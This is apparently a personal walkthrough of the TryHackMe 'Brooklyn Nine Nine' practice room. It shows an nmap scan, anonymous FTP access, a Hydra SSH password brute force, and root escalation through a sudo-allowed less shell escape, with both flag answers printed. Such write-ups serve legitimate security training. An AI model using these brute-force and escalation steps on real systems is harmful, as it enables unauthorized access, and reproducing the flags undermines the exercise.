<p align="center">October 30, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{177}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Brooklyn Nine Nine&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}}$$
</h1>
<p align="center">This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/brooklynninenine">Brooklyn Nine Nine</a>.</p><br>
<p align="center">
  <img height="160px" hspace="20" src="https://github.com/user-attachments/assets/dcd7cff2-8cb9-4327-9031-4b386f8eb520">
  <img height="160px" src="https://github.com/user-attachments/assets/db9bca4f-008c-4959-a5b0-3aa2a37e4214">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Deploy and get hacking](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [User flag](#1.1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Root flag](#1.2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Room complete](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My journey](#3)

<br>
<p align="center">This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.</p>


<h2>Task 1. Deploy and get hacking<a id='1'></a></h2>

> 1.1. <em>User flag</em><br><a id='1.1'></a>
>> <strong>ee11cbb19052e40b07aac0ca060c23ee</strong><br>
<p><br></p>


> 1.2. <em>Root flag</em><br><a id='1.2'></a>
>> <strong>63a9f0ea7bb98050796b649e85481845</strong><br>
<p><br></p>


<pre><code>
$ sudo nmap -sV -sS [Target]

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-30 03:47 GMT
Nmap scan report for ip-[Target].eu-west-1.compute.internal ([Target])
Host is up (0.0010s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:04:A3:21:B9:4B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds
</code></pre>

<pre><code>
$ ftp [Target]
Connected to [Target].
220 (vsFTPd 3.0.3)
Name ([Target]1:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (55.6299 kB/s)
ftp> bye
221 Goodbye.
</code></pre>

<pre><code>
$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
</code></pre>

<pre><code>
$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://[Target]
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2024-10-30 03:56:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.250.221:22/
[22][ssh] host: [Target]   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2024-10-30 03:57:06
</code></pre>

<pre><code>
$ ssh jake@1[Target]
The authenticity of host '[Target] ([Target])' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[Target]' (ECDSA) to the list of known hosts.
jake@[Target]'s password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ s -la
total 44
drwxr-xr-x 6 jake jake 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 root root 1349 May 26  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17  2020 .cache
drwx------ 3 jake jake 4096 May 17  2020 .gnupg
-rw------- 1 root root   67 May 26  2020 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26  2020 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18  2020 .ssh
-rw-r--r-- 1 jake jake    0 May 17  2020 .sudo_as_admin_successful
jake@brookly_nine_nine:~$ pwd
/home/jake
jake@brookly_nine_nine:~$ cd ..
jake@brookly_nine_nine:/home$ ls -la
total 20
drwxr-xr-x  5 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
drwxr-xr-x  5 amy  amy  4096 May 18  2020 amy
drwxr-xr-x  6 holt holt 4096 May 26  2020 holt
drwxr-xr-x  6 jake jake 4096 May 26  2020 jake
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
</code></pre>


<pre><code>
$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
</code></pre>


<pre><code>
$ sudo less /etc/profile
</code></pre>


<pre><code>
# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
    # The file bash.bashrc already sets the default PS1.
    # PS1='\h:\w\$ '
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "`id -u`" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
  fi
fi

if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i
    fi
  done
  unset i
fi
~
~
!/bin/sh
</code></pre>

<pre><code>
$ jake@brookly_nine_nine:~$ sudo less /etc/profile
# whoami
root
# pwd
/home/jake
# cd /
# ls -la
total 100
drwxr-xr-x  24 root root  4096 May 19  2020 .
drwxr-xr-x  24 root root  4096 May 19  2020 ..
drwxr-xr-x   2 root root  4096 May 17  2020 bin
drwxr-xr-x   3 root root  4096 May 19  2020 boot
drwxr-xr-x   2 root root  4096 May 17  2020 cdrom
drwxr-xr-x  17 root root  3700 Oct 30 03:45 dev
drwxr-xr-x  93 root root  4096 May 26  2020 etc
drwxr-xr-x   5 root root  4096 May 18  2020 home
lrwxrwxrwx   1 root root    34 May 19  2020 initrd.img -> boot/initrd.img-4.15.0-101-generic
lrwxrwxrwx   1 root root    33 May 17  2020 initrd.img.old -> boot/initrd.img-4.15.0-99-generic
drwxr-xr-x  22 root root  4096 May 18  2020 lib
drwxr-xr-x   2 root root  4096 Feb  3  2020 lib64
drwx------   2 root root 16384 May 17  2020 lost+found
drwxr-xr-x   2 root root  4096 Feb  3  2020 media
drwxr-xr-x   2 root root  4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root  4096 Feb  3  2020 opt
dr-xr-xr-x 104 root root     0 Oct 30 03:45 proc
drwx------   4 root root  4096 May 18  2020 root
drwxr-xr-x  27 root root   880 Oct 30 03:45 run
drwxr-xr-x   2 root root 12288 May 17  2020 sbin
drwxr-xr-x   4 root root  4096 May 17  2020 snap
drwxr-xr-x   3 root root  4096 May 17  2020 srv
dr-xr-xr-x  13 root root     0 Oct 30 03:45 sys
drwxrwxrwt  10 root root  4096 Oct 30 03:46 tmp
drwxr-xr-x  10 root root  4096 Feb  3  2020 usr
drwxr-xr-x  15 root root  4096 May 17  2020 var
lrwxrwxrwx   1 root root    31 May 19  2020 vmlinuz -> boot/vmlinuz-4.15.0-101-generic
lrwxrwxrwx   1 root root    30 May 17  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-99-generic
# cd root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
</code></pre>

<h2>Room Complete<a id='2'></a></h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/5dbc0388-726d-403f-b607-9b99e7e002f6)

<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

![image](https://github.com/user-attachments/assets/ed1be3a6-b455-45da-90c2-b0f71092546d)

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
